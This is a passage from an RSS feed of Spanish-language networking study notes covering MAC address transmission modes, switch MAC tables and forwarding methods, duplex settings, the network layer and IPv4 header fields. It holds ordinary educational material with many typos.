 <br><br>En Ethernet, se utilizan diferentes direcciones MAC para las comunicaciones previamente vistas en la sección de <a data-href="0. Transmission#Delivery Options" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/0.-transmission.html#Delivery_Options" class="internal-link" target="_self" rel="noopener nofollow">0. Transmission &gt; Delivery Options</a>, es decir, unicast, broadcast y multicast de Capa 2.<br>Una dirección MAC de unicast es la dirección única que se utiliza cuando se envía una trama desde un único dispositivo de transmisión a un único dispositivo de destino:<br><img alt="unicast_mac_address_example_image.png" src="https://dobliuw.com/lib/media/unicast_mac_address_example_image.png"><br>En este ejemplo, un host con la dirección IPv4 192.168.1.5 (Origen) solicita una página web del servidor en la dirección IPv4 unicast 192.168.1.200. Para que un paquete de unicast se envíe y se reciba, la dirección IP de destino debe estar incluida en el encabezado del paquete IP. Además, el encabezado de la trama de Ethernet también debe contener una dirección MAC de destino correspondiente. Las direcciones IP y MAC se combinan para la distribución de datos a un host de destino específico.<br>El proceso que utiliza un host de origen para determinar la dirección MAC de destino asociada con una dirección IPv4 se conoce como Addresses Resolution Protocol (ARP). El proceso que utiliza un host de origen para determina la dirección MAC de destino asociada con una dirección IPv6 se conoce como Neigthboor Discovery (ND).<br><br><br>Cada dispositivo de la LAN Ethernet recibe y procesa una trama de boardcast Ethernet. Las características de una transmisión Ethernet son las siguientes:<br>
<br>Tiene una dirección MAC de destino con el valor hexadeciaml FF:FF:FF:FF:FF:FF (48 unidades en binario).
<br>Está inundado todos los puertos del switch Ethernet excepto el puerto entrante.
<br>No es reenviado por un router.
<br>Si los datos encapsulados son paquete broadcast IPv4, esto significa que el paquete contiene una dirección IPv4 de destino que tiene todos los (1s) en la parte del host. Esta numeración en la dirección significa que todos los hosts de esa red local (Dominio de Broadcast) recibirán y procesarán el paquete.<br><img alt="broadcast_mac_address_example_image.png" src="https://dobliuw.com/lib/media/broadcast_mac_address_example_image.png"><br>Como se muestra en la imagen, el host de origen envía un paquete broadcast IPv4 a todos los dispositivos de la red. La dirección IPv4 de destino es una dirección broadcast. 192.168.1.255. Cuando el paquete de broadcast IPv4 se encapsula en la trama de Ethernet, la dirección MAC de destino es la dirección MAC de difusión FF:FF:FF:FF:FF:FF en hexadecimal.<br>DHCP para IPv4 es un ejemplo de protocolo que utiliza direcciones de broadcast Ethernet e IPv4.<br>Sin embargo, no todas las transmisiones Ethernet llevan un paquete de broadcast IPv4. Por ejemplo, las solicitudes ARP no utilizan IPv4, pero el mensaje ARP se envía como un broadcast Ethernet.<br><br><br>Una trama de multicas de ethernet es recibida y procesada por un grupo de dispositivos en la LAN de Ethernet que pertencen al mismo grupo de multicas. Las características de una multicas Ethernet son las siguientes:<br>
<br>Hay una dirección MAC de destino 01:00:5E cuando los datos encapsulados son un paqeute de multicas IPv4 y una dirección MAC de destino de 33:33 cuando los datos encapsulados son un paquete de multicas IPv6.
<br>Existen otras direcciones MAC de destino de multicas reservadas para cuando los datos encapsulados no son IP, como Spanning Tree Protocol (STP) y Link Layer Discovery Protocol (LLDP).
<br>Se inundan todos los puertos del swtich Ethernet excepto el puerto entrante, a menos que el swtich esté configurado para la indagación de multicast.
<br>No es reenviado por un router, a menos que el router esté configurado para enrutar paquetes de multicast.
<br>Si los datos encapsulados son un paquete de multicas IP, a los dispositivos que pertenecen a u ngrupo de multicas se les asigna una dirección IP de grupo de multicas. El rango de direcciones de multicast IPv4 es 224.0.0.0 a 239.255.255.255. El rango de direcciones de multicas IPv6 comienza con ff00::/8. Debido a que las direcciones de multicas representan un grupo de direcciones (A veces denominado grupo de hosts), solo se pueden utilizar como el destino de un apquete. El origen siempre tiene una dirección de unicast.<br>Al igual que con las direcciones de unicast y broadcast, la dirección IP de multicast requiere una dirección MAC de multicas correspondiente par entregar tramas en una red local. La dirección MAC de multicas está asociada a la dirección de multicas IPv4 o IPv6 y utiliza la información de direccionamiento de dicha dirección.<br><img alt="multicas_mac_address_example_image.png" src="https://dobliuw.com/lib/media/multicas_mac_address_example_image.png"><br>Los protocolos de enrutamiento y otros protocolos de red utilizan direccionamiento multicas. Las aplicaciones como el software de video e imágenes trambién pueden utilizar direccionamiento multicas, aunque las aplicaciones multicas no son tan comunes.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-mac-address-in-transmission-modes.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/2. MAC Address in Transmission Modes.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 16 Oct 2024 13:27:08 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/unicast_mac_address_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/unicast_mac_address_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Swtich Fundamentals]]></title><description><![CDATA[ 
 <br><br>Ahora que entendemos en profundidad que son y para que sirven las direcciones MAC (<a data-href="1. Sublayer MAC#MAC Address Ethernet" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-sublayer-mac.html#MAC_Address_Ethernet" class="internal-link" target="_self" rel="noopener nofollow">1. Sublayer MAC &gt; MAC Address Ethernet</a>), es hora de tocar un tema muy relevante, el cual es cómo un switch utiliza estas direcciones para reenviar (O descartar) tramas a otros dipositivos de una red. Si un switch acaba de reenviar de cada trama que recibió todos los puertos, la red estaría tan congestionada que probablemente se detendría por completo.<br>Un switch Ethernet de Capa 2 usa direcciones MAC de Capa 2 para tomar decisiones de reenvío. No tiene conocimiento de los datos (Protocolo) que se transportan en la porción de datos de la trama, como un paquete IPv4m un mensaje ARP o un paquete IPv6 ND. El switch toma sus decisiones de reenvío basándose únicamente en las direcciones MAC Ethernet de Capa 2.<br>Un switch Ethernet examina su tabla de direcciones MAC para tomar una decisión de reenvío para cada trama, a diferencia de los hubs Ethernet heredados que repiten bits en todos los puertos excepto del puerto entrante. En la imagen, se acaba de encender el switch de cuatro puertos. La tabla de direcciones MAC muestra que aun no se ha aprendido las direcciones MAC para las cuatro PC conectadas.<br><img alt="empty_mac_address_table_example_image.png" src="https://dobliuw.com/lib/media/empty_mac_address_table_example_image.png"><br>EFn ocaciones, la tabla de direcciones MAC se denomina tabla de memoria de contenido direccionable (CAM).<br><br><br>El switch arma la tabla de direcciones MAC de manera dinámica después de examinar la dirección MAC de origen de las tramas recibidas en un puerto. El swtich reenvía las tramas después de buscar una coindicencia entre la dirección MAC de destino de la trama y una entrada de la tabla de direcciones MAC.<br><br>Se examina la dirección MAC de Origen de cada trama que ingresa a un switch para obtener información nueva. Esto se realiza axaminando la dirección MAC de origen de la trama y el número de puerto por el que ingresó al switch. Si la dirección MAC de origen no existe, se la agrega a la tabla, junto con el número de puerto de entrada. Si la dirección MAC de origen existe, el switch actualiza el temporizador de actualización para esa entrada. De manera predeterminada, la mayoría de los switches Ethernet guardan una entrada en la tabla durante cinco minutos.<br>En la siguiente imagen, por ejemplo, la PC-A está enviando una trama Ethernet a la PC-D. La tabla muestra que el switch agrega la dirección MAC para PC-A a la tabla de direcciones MAC.<br><img alt="learning_and_adding_mac_address_to_mac_address_table_example_image.png" src="https://dobliuw.com/lib/media/learning_and_adding_mac_address_to_mac_address_table_example_image.png"><br><br>Si la dirección MAC de destino es una dirección de unicast, el switch busca una coincidencia entre la dirección MAC de destino de la trama y una entrada en la tabla de direcciones MAC. Si la dirección MAC de destino está en la tabla, reenvía la trama por el puerto especificado. Si la dirección MAC de destino no está en la tabla, el switch reenvía la trama por todos los puertos, excepto el de entrada. Esto se conoce como unicast desconocida.<br>Como se muestra en la imagen, el switch no tiene la dirección MAC de destino en su tabla para PC-D, por lo que envía la trama a todos los puertos excepto el puerto 1.<br><img alt="unicast_unrecognized_example_image_switch_forwarding.png" src="https://dobliuw.com/lib/media/unicast_unrecognized_example_image_switch_forwarding.png"><br>Si la dirección MAC de destino es de broadcast o multicast, la trama también se envía por todos los puertos, excepto el de entrada.<br><br><br>En lo que respecta al friltrado de tramas, a medida que un switch recibe tramas de diferentes dispositivos, puede completar la tabla de direcciones MAC examinando la dirección MAC de cada trama. Cuando la tabla de direcciones MAC del swtich contiene la dirección MAC de destino, puede filtrar la trama y reenviarla a un solo puerto, el que corresponde.<br>Ejemplo de este proceso:<br><br>En la imagen podemos observar que la PC-D responde a PC-A. El Switch ve la dirección MAC de PC-D en la trama entrante en el puerto 4. A continuación, el switch coloca la dirección MAC de PC-D en la tabla de direcciones MAC asociada con el puerto 4<br><img alt="frame_filtering_1_example_image.png" src="https://dobliuw.com/lib/media/frame_filtering_1_example_image.png"><br><br>A continuación, dado que el swtich tiene la dirección MAC de destino para la PC-A en la tabla de direcciones MAC, enviará la trama solo al puerto 1, como se muestra a continuación:<br><img alt="frame_filtering_2_example_image.png" src="https://dobliuw.com/lib/media/frame_filtering_2_example_image.png"><br><br>A continuación, PC-A envía otra trama a PC-D como se muestra en la imagen. LA tabla de direcciones MAC ya contiene la dirección MAC para PC-A; por lo tanto, el temporizado de actualización de cinco minutos para esa entrada se restablece. Luego, debido a que la tabla de switch contiene la dirección MAC de destino para PC-D, envía la trama solo por el puerto 4:<br><img alt="frame_filtering_3_example_image.png" src="https://dobliuw.com/lib/media/frame_filtering_3_example_image.png"><br>Para finalizar me gustaría dejar en claro que un switch puede tener muchas direcciones MAC asociadas a un mismo puerto. Esto es común cuando el switch está conectado a otro switch. El switch tiene una entrada independiente en la tabla de direcciones MAC para cada trama recibida con una dirección MAC de origen diferente.<br><br><br>Como vimos, los switches utilizan sus tablas de direcciones MAC para de terminar qué puerto utilizar para reenviar tramas. Con los switches Cisco, en realidad hay dos métodos de reenvío de tramas y hay buenas razones para usar uno en lugar de otro, dependiendo de la situación.<br>Los switches utilizan uno de los siguientes métodos de reenvío para el switching de datos entre puertos de la red:<br>
<br>Switching de almacenamiento y envío: Este método de reenvío de trama recibe la trama completa y calcula el CRC. La CRC utiliza una fórmula matemática basada en la cantidad de bits (Números uno) de la trama para determinar si esta tiene algún error. Si la CRC es válida, el switch busca la dirección de destino, que determina la interfaz de salida. Luego, la trama se reenvía desde el puerto correcto.
<br>Switching por método de corte: Este método de reenvío de tramas reenvía la trama antes de que se reciba por completa. Como mínimo, se debe leer la dirección de desetino para que la trama se pueda enviar.
<br><br>Una gran ventaja de store-and-forward switching (Switching de almacenamiento y envío), es que determina si una trama tiene errores atnes de propagarla. Cuando se detecta un error en la trama, el switch la descarta. El proceso de descarte de las tramas con errores reduce el ancho de banda consumido por datos dañados. Store-and-forward switching se requiere para el análisis de calidad de servicio (QoS) en las redes convergentes, donde se necesita una calisficación de la trama para decidir el roden de prioridad del tráfico. Por ejemplo, los flujos de datos de voz sobre IP deben tener prioridad sobre el tráfico de navegación web.<br><br>En este tipo de switching, el switch actúa sobre los datos apenas los recibe, cinluso si la tranmisión aún no se completó. El switch almacena la cantidad suficiente de trama como para leeer la dirección MAC de destino para que pueda determinar a qué puerto debe reenviar los datos. La dirección MAC de destino se encuentra en los primeros 6 bytes de la trama despúes del prámbulo. El switch busca la dirección MAC de destino en la tabla de switching, determina el puerto de la interfaz de salida y reenvia la trama a su destino mediante el puerto de switch designado. El switch no lleva a cabo ningun verificación de errores en la trama.<br>A continuación, se presentan dos variantes del cut-through switching:<br>
<br>
Switching de reenvío rápido: Este método ofrece el nivel de latencia más bajo. Fast-forward switching reenvía el paquete inmediatamente después de leer la dirección de destino. Como este tipo de switching comienza a reenviar el paquete antes de recibirlo por completo, es posible que, a veces, los paquetes se distribuyan con errores. Esto ocurre con poca frecuencia y la NIC de destino descarta el paquete defectuoso al recibirlo. En el modo de fast-forward, la latencia se mide desde el primer bit recibido hasta el pirmer bit transmitido. Este switching es el método de corte típico.

<br>
Switching libre de fragmentos: En este método, el switch almacena los primeros 64 bytes de la trama antes de reenviarla. El fragment-free switching se puede ver como un punto medio entre el store-and-forward switching y el fast-forward switching. El motivo por el que este tipo de switching almacena solamente los primeros 64 bytes de la trama es que la mayoría de los errores y las colisiones de la red se producen en esos primeros bytes. Este switching intenta mejorar el fast-forward switching al realizar una pequeña verificación de errores en los primeros 64 bytes de la trama para asegurar que no haya ocurrido una colisión antes de reenviarla. Este método es un punto medio entre la alta latencia y la alta integridad del store-and-forward switching, y la baja latencia y la baja integridad del fast-forward switching.

<br>Algunos switches están cofigurados para realizar el cut-through switching en cada puerto hasta alcanzar un umbral de errores definido por el usuario y, luego, cambiar automáticamente al store-and-forward switching. Si el índice de error está por debajo del umbral, el puerto vuelve automáticamente al cut-through switching.<br><br><br>El almacenamiento en búfer de memoria en los Switches puede ser una técnica utilizada por los Switches Ethernet para almacenar tramas antes de enviarlas. También se puede utilizar el almacenamiento en búfer cuando el puerto de destino está ocupado debiado a la congestión. El switch almacena la trama hasta que se pueda transmitir.<br>Como se muesta en la siguiente tabla, hay dos métodos de almacenamiento en memoria intermedia:<br><br>El almacenamiento en búfer de memoria compartida también da como resultado la capacidad de almacenar tramas más grandes con potencialmente menos tramas descartadas. Esto es importante con la conmutación asimétrica, que permite diferentes velocidades de datos en diferentes puertos, como cuando se conecta un servidor a un puerto de switch de 10 Gbps y PC a puertos de 1 Gbps.<br><br><br>Dos de las configuraciones más básicas en un switch son el Ancho de Banda (<a data-href="0. Physical Layer#Bandwidth" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/0.-physical-layer.html#Bandwidth" class="internal-link" target="_self" rel="noopener nofollow">0. Physical Layer &gt; Bandwidth</a>) y la Configuración dúplex (<a data-href="1. Full Dúplex and Semidúplex comunications" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/topologies/1.-full-dúplex-and-semidúplex-comunications.html" class="internal-link" target="_self" rel="noopener nofollow">1. Full Dúplex and Semidúplex comunications</a>) para cada puerto de switch individual. Es fundamental que los parámetros de dúplex y de ancho de banda coincidan entre el puerto de switch y los dispositivos conectados, como una computadora u otro switch.<br>Se utilizan dos tipos de parámetros dúplex para las comunicaciones en una red Ethernet:<br>
<br>Full dúplex: Ambos extremos de la conexión pueden enviar y recibir datos simultáneamente.
<br>Semi dúplex: Solo uno de los extremos de la conexión puede enviar datos por vez.
<br>La autonegociación es una función optativa que se encuentra en la mayoría de los switches Ethernet y NICs. Permite qeu dos dispositivos negocien automáticamente las mejores capacidades de velocidad y dúplex. Si ambos dispositivos tienen la funcionalidad, se selecciona dúplex completo, junto con el ancho de banda comúm más alto.<br>En la siguiente imagen, la NIC Ethernet para PC-A puede funcionar en dúplex completo o semi duplex, y en 10 Mbps o 100 Mbps:<br><img alt="nic_ethernet_pc_a_duplex_example_image.png" src="https://dobliuw.com/lib/media/nic_ethernet_pc_a_duplex_example_image.png"><br>La PC-A está conectada al Switch S1 por el puerto 1, que puede operar en duplex completo o medio duplex, y en 10 Mbps, 100 Mbps o 1000 Mbps (1 Gbps). Si ambos dispositivos utilizan la autonegociación, el modo de funcionamento será dúplex completo y 100 Mb/s.<br>La falta de coincidencia dúplex es una de las causas más comunes de problemas de rendimiento en enlaces Ethernet de 10/100 Mbps. Ocurre cuando un puerto en el enlace opera en medio dúplex mientra que el otro puerto opera en dúplex completo, como se muestra en la siguiente imagen: <br><img alt="issues_for_2_devices_one_with_fullduplex_and_another_one_with_semiduplex_example_image.png" src="https://dobliuw.com/lib/media/issues_for_2_devices_one_with_fullduplex_and_another_one_with_semiduplex_example_image.png"><br>La falta de coincidencia dúplex se produce cuando se restablecen uno o ambos puertos en un enlace, y el proceso de negociación automática no da como resultado que ambos socios del enlace tengan la misma configuración. También puede ocurrir cuando los usuarios reconfiguran un lado del enlace y olvidan reconfigurar el otro. Ambos lados de un enlace deben tener activada la autonegociación. o bien ambos deben tenerla desactivada. La práctica recomienda conifgurar ambos puertos del Swtich Ethernet como dúplex completo.<br><br><br>Las conexiones entre dispositivos requerían el uso de un cable cruzado o directo. El tipo de cable requerido dependía del tipo de dispositivo de interconexión.<br>Por ejemplo, la imagen identifica el tipo de cable correcto necesario para interconectar dispositivos de switch a switch, switch a router, switch a host o router a host. Se utiliza un cable cruzado cuando se conectan dispositivos similares, y un cable directo para conectarse a dispositivos diferentes.<br><img alt="Pasted image 20241016154520.png" src="https://dobliuw.com/lib/media/pasted-image-20241016154520.png"><br>Actualmente, la mayor parte de los dispositivos admiten la característica interfaz cruzada automática dependiente del medio (Auto-MDIX). cuando está habilitado, el Switch detecta automáticamente el tipo de cable conectado al puerto y configura las interfaces en consecuencia. Por lo tanto, se puede utilizar un cable directo o cruzado para realizar la conexión con un puerto 10/100/1000 de cobre situado en el Switch, independientemente del tipo de dispositivo que esté en el otro extremo de la conexión.<br>La función Auto-MDIX está habilitada de manera predeterminada en los Switches que ejecutan Cisco IOS 12.2 SE o posterior. Sin embargo, la característica ppodría estar deshabilitada. Por esta razón, siempre debe utilizarse el tipo de cable correcto y no confiar en la función Auto-MDIX. Esta puede se puede volver a habilitar mediante el comando mdix auto de configuración de interfaz.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/3.-switches-and-mac-address-table.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/3. Switches and MAC Address Table.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 21 Oct 2024 19:07:09 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/empty_mac_address_table_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/empty_mac_address_table_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Network Layer]]></title><description><![CDATA[ 
 <br><br>La capa de red, o Capa 3 del <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a>, proporciona servivcios para permitir que los dispositivos finales intercambien datos a través de redes. Como se muestra en la imagen IP versión 4 (IPv4) e IP versión 6 (IPv6) son los principales protocolos de comunicación de esta capa. Otros protocolos de capa de red incluyen protocolos de enrutamiento como Open Shortest Path First (OSPF) y protocolos de mensajería como Internet Control Message Protocol (ICMP).<br><img alt="Pasted image 20241017142504.png" src="https://dobliuw.com/lib/media/pasted-image-20241017142504.png"><br>Para lograr comunicaciones end-to-end a través de los límites de la red, los protocolos de capa de red realizan cuatro operaciones básicas:<br>
<br>
Direccionamiento de endpoints: Los dispositivos finales deben configurarse con una dirección IP única para la identificación en la red.

<br>
Encapsulación: La capa de red encapsula la unidad de datos de protocolo (PDU) de la capa de transporte en un paquete. El proceso de encapsulamiento agrega información de encabezado IP, como la dirección IP de los hosts de origen (Emisores) y de destino (Receptores). El proceso de encapsulación lo realiza el origen del paquete IP.

<br>
Enrutamiento: La capa de red proporciona servicios para dirigir los paquetes a un host de destino en otra red. Para transferir un paquete a otras redes, debe procesarlo un router. La función del router es seleccionar la mejor ruta y dirigir los paquetes al host de destino en un proceso que se denomina "Enrutamiento". Un paquete puede cruzar muchos routers antes de llegar al host de destino. Se denomina "salto" a cada router que curza u paquete antes de alcanzar el host de destino.

<br>
Desencapsulación: Cuando un paquete llega a la capa de red del host de destino, el host  verifica el encabezado IP del paquete. Si la dirección IP de destino dentor del encabezado coincide con su propia dirección IP, se elimina este encabezado del paquete. Una vez que la capa de red desencapsula el paquete, la PDU de capa 4 que se obtiene se transfiere al servicios apropiado en la capa de transporte. El proceso de desencapsulación lo realizaa el host de destino del paquete IP.

<br>A diferencia de la capa de transporte (Capa 4 del Modelo OSI), que gestiona el trasnporte de datos entre los procesos que se ejecutan en cada host, los protocolos de comunicación de la capa de  red (Es decir, IPv4 e IPv6) especifican la estructura de paquetes y el procesamiento utilziado para transportar los datos de un host a otro host. La capa de red puede transportar paquetes de varios tipos de comunicación entre varios hosts porque funciona sin tener en cuenta los datos que contiene cada paquete.<br><br><br>IP encapsula el segmento de la capa de transporte (La capa por encima de la Capa 3) u otros datos agregando un encabezado IP. Este encabezado IP se usa para entregar el paquete al host de destino.<br>La imagen a continuación muestra cómo la PUD de la capa de transporte (Segmento) es encapsulada por la PDU de la capa de red para crear un paquete IP.<br><img alt="Pasted image 20241017143429.png" src="https://dobliuw.com/lib/media/pasted-image-20241017143429.png"><br>El proceso de encapsulamiento de datos capa por capa permite que se desarrollen y se escalen los servicios en las diferentes capas sin afectar a las otras capas. Esto significa que IPv4 o IPv6 o cualquier protocolo nuevo que se desarrolle en el futuro puede armar sin inconvenientes un paquete con los segmentos de capa de trasnporte.<br>El encabezado IP es examinado por dispostiivos de Capa 3 (Es decir, routers y switches de capa 3) a medida que viaja a través de una red a su destino. Es importante tener ene cuenta que la información de direccionamiento IP permanece igual desde el momento en que el paquete sale del host de origen hasta que llega al host de destino, excepto cuando se traduce por el dispositivo que realiza la traducción de direcciones de red (NAT) para IPv4.<br>Los routes implementan protocolos de enrutamiento para enrutar paquetes entre redes. El enrutamiento realizado por estos dispositivos intermediarios examina el direccionamiento de la capa de red en el encabezado del paquete. En todos los casos, la porción de datos del paquete, es decir, la PDU de la capa de trasnporte encapsulada u otros datos, permanece sin cambios durante los procesos de la capa de red.<br><br><br>IP se diseñó como un protocolo con sobrecarga baja. Provee solo las funciones necesarias para enviar un paquete de un origen a un destino a través de un sistema interconectado de redes. El protocolo no fue diseñado para rastrear ni admitir el flujo de paquetes. Estas funciones, si es necesario, están a c argo de otros protocolos en otras capas, principalmente TCP en la Capa 4.<br>Estaas son las características báscias del protocolo IP:<br>
<br>Without Conection / Sin Conexión: No hay conexión con el destino establecido antes de enviar paquetes de datos.
<br>Best Effort / Mejor Esfuerzo: La IP es inherentemente poco confiable porque no se garantiza la entrega de paquetes.
<br>Independent of the Media / Independiente de los medios: La operación es independiente del medio (Es decir, cobre, fibra óptica o inalámbrico) que transporta los datos.
<br><br>IP no tiene conexión, lo que significa qeu IP no crea una conexión de extremo a extremo dedicada antes de enviar lso datos. La comunicación sin conexión es conceptualmente similar a enviar una carta a alguien sin notificar al destinatario por adelantado. <br>Las comunicaciones de datos sin conexión funcionan con el mismo principio. Como se muestra en la imagen, IP no requiere un intercambio incial de información de control para establecer una conexión de extremo a extremo antes de que se reenvíen los paquetes: <br><img alt="Pasted image 20241017144456.png" src="https://dobliuw.com/lib/media/pasted-image-20241017144456.png"><br><br>El protocolo IP tampoco necesita campos adicionales en el encabezado para mantener una conexión establecida. Este proceso reduce en gran medida la sobrecarga del protooclo IP. Sin embargo, sin una conexión completa preestablecida, los remitentes no saben si los dispositivos de destino están presentes y en funcionamiento cuando envía paquetes, ni tampoco si el destinatario recibe el paquete o si puede acceder al paquete y leerlo. <br>El protocolo IP no garantiza que todos los apquetes que se envían se recibean. En la siguiente imagen, se muestran las características de entrega de mejor esfuerzo o poco confiable del protocolo IP: <br><img alt="Pasted image 20241017144741.png" src="https://dobliuw.com/lib/media/pasted-image-20241017144741.png"><br>Dado que es un protocolo de capa de red no confiable, el protocolo IP no garantiza qeu se reciban todos los apquetes enviados. Otros protocolos administran el proceso de seguimiento de apquetes y de aseguramiento de entrega.<br><br>Que sea poco confiable significa que IP no tiene la funcionalidad para administrar o recuperar paquetes no recibidos o dañados. Esto se debe a que, si bien los paquetes IP se envía ncon información sobre la ubicación de la entrega, no contienen información que pueda procesarse para informar al remitente si la entrega fue exitosa. Es posible que los paquetes lleguen dañados o fuera de secuencia al destino o que no lleguen en absoluto. IP no tiene la funcionalidad de retransmitir paquetes si se producen errores.<br>Las aplicaciones que utilizan los datos o los servicios de capas superiores deben solucionar problemas como el envío de paquetes fuera de orden o la pérdida de paquetes. Esta característica permite que IP funcione de manera muy eficaz. En el conjunto de protocolos TCP / IP, la confiabilidad es la función del protocolo TCP en la capa de transporte.<br>IP funciona independientemente de los medios que transportan los datos en las capas más bajas de la pila de protocolos. Como se muestra en la imagen, los paquetes IP pueden ser señales electrónicas que se trasnmiten por cables de cobre, señales ópticas que se trasnmiten por fibra óptica o señales de radio inalámbricas.<br><img alt="Pasted image 20241017145727.png" src="https://dobliuw.com/lib/media/pasted-image-20241017145727.png"><br>La capa de enlace de datos (<a data-href="0. Data Link Layer" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/0.-data-link-layer.html" class="internal-link" target="_self" rel="noopener nofollow">0. Data Link Layer</a>)es responsable de tomar un apquete IP y prepararlo para la tranmisión a través del medio de comunicación. Esto sginifica que la entrega del paquete IP no se limita a ningún medio en particular. <br>Sin embargo, la capa de red tiene en cuenta una de las características más importantes delm edio, que es el tamaño máximo de PDU que cada medio puede transportar. Esta característica se conoce como MTU (Maximum Transmission Unit). Parte del control de la comunicación entre la capa de enlace de datos y la capa de red consiste en establecer el tamaño máximo del paquete. La capa de enlace de datos pasa el valor de MTU a la capa de red. La capa de red luego determina qué tamaño pueden tener los paquetes.<br>En algunos casos, un dispositivo intermedio, generalmente un router, debe dividir un paquete IPv4 cuando lo reenvía de un medio a otro con una MTU más pequeña. Este proceso se denomina Fragmentación de paquetes. La fragmentación provoca latencia. El router no puede fragmentar los paquetes IPv6.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/0.-network-layer.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/3. Network/0. Network Layer.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 17 Oct 2024 18:01:08 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241017142504.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241017142504.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[IPv4 Packet Header]]></title><description><![CDATA[ 
 <br><br>IPv4 es uno de los porotocolos de comunicación de la capa de red principal. El encabezado del paquete IPv4 se utiliza para garantizar que este paquete se entrega en su siguiente parada en el camino a su dispositivo final de destino.<br>El encabezado de paquetes IPv4 consta de campos que contiene inforamción importante sobre el paquete. Estos campos tiene números binarios que examinan el proceso de capa 3.<br><br><br>Los valores binarios de cada campo indetifican diversos parámetros de configuración del paquete IP. Los diagaramas de encabezado del protocolo, que se leen de izsquierda a derecha y de arriba hacia abajo, proporcinan una representación visual de consulta al analizar los campos de protocolo. El diagrama de encabezado del protocolo IP en la imagen a continuación identifica los campos de un paquete IPv4.<br><img alt="Pasted image 20241017150521.png" src="https://dobliuw.com/lib/media/pasted-image-20241017150521.png"><br>Los campos significativos de este encabezado IPv4 incluyen lo siguiente:<br>
<br>Versión: Contiene un valor bianrio de 4 bits establecido en 0100 que identifica como un paquete IPv4.
<br>Servicios diferenciados o DiffServ (DS): Este campo, fundamentalmente conocido como Tipo de Servicio (ToS), es un campo de 8 bits que  se utiliza para determinar la prioridad de cada paquete. Los seis bits más significativos del campo SiffServ son los bits de punto de código de servicios diferenciados (DSCP) y los dos úlitmos bits son los bits de notifiación de congestión explícita (ECN).
<br>Checksum o Suma de comprobación de encabezado: Se utiliza para detectar daños en este encabezado.
<br>Tiempo de duración o Time To Live (TTL): TTL contiene un valor binario de 8 bits que se utiliza para limitar la vida útil de un paquete. El dispositivo de origen del paquete IPv4 establece el valor TTL inicial. Se reduce en un cada vez que el paquete es procesado por un router. Si el campo TTL llega a cero, el router descarta el paquete y envía a la dirección IP de origen un mensaje de tiempo superado del protocolo de mensajes de control de internet (ICMP). debido a que el router disminuye el TTL de c ada paquete, el router también debe volver a calcular al suma de comprobalción del encabezado.
<br>Protocolo: Este campo se utiliza para identificar el protocolo del siguiente nivel. Este calor binario de 8 bits indica el tipo de carga de datos que lleva el paquete, lo que permite que la capa de red transmita los datos al rpotoclo de la capa superior apropiado. ICMP (1), TCP (6) y UDP (17) son algunos valores comunes.
<br>Dirección IPv4 de Origen: Contiene un valor binario de 32 bits que representa la dirección IPv4 de origen del paquete (Siempre una dirección Unicast).
<br>Dirección IPv4 de Destino: Contiene un valor binario de 32 bits que representa la dirección IPv4 de destino del paquete (Puede ser Unicast, Multicast o Broadcast).
<br>Los dos campos a los que se hace más referencia son los de dirección IP de origen y de destino. En estos campos, se identifica de dónde viene el paquete y a dónde va. Por lo general, estas direcciones no cambian mientras se viaja desde el origen al destino.<br>Para identificar y validar el paquete, se usan los campos de longitud del encabezado de Internet (IHL), longitud total y el encabezado checksum.<br>Para reordenar un paquete fragmentado, se usan otros campos. Específicamente, el paquete IPv4 utiliza los campos de identificación, señaladores y desplazamiento de fragmentos para llevar un control de los fragmentos. Un router puede tener que fragmentar un paquete IPv4 cuando lo reenvía de un medio a otro con una MTU más pequeña.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/1.-ipv4-packet.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/3. Network/1. IPv4 Packet.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 17 Oct 2024 18:15:37 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241017150521.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241017150521.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[IPv4 Limitations]]></title><description><![CDATA[ 
